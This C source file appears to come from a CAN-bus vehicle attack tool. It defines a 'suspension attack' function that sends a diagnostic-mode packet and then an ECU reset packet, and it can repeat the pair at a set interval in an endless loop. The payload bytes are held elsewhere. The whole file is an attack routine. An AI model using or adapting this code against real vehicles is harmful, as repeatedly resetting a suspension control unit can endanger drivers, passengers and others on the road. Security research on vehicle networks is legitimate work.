#include "all_headers.h"

/*================================================================
suspension_resetecu.c
This function performs the suspension attack by resetting the ECU.
1st enter diag mode, 2nd restart the ecu

functions:
- suspension_resetecu: performs the suspension attack by resetting the ECU
==================================================================*/

void suspension_resetecu(int socket, struct sockaddr_can *addr, int canid, int time_diff){

    do {
        // resetpayload1 [enter diag mode]
        send_can_packet(socket, addr, suspension.payload1, suspension.payload1_len, canid);
        // resetpayload2 [restart the ecu]
        send_can_packet(socket, addr, suspension.payload2, suspension.payload2_len, canid);

        if (time_diff == 0) break;
        usleep(time_diff * 1000);
    } while (1);

}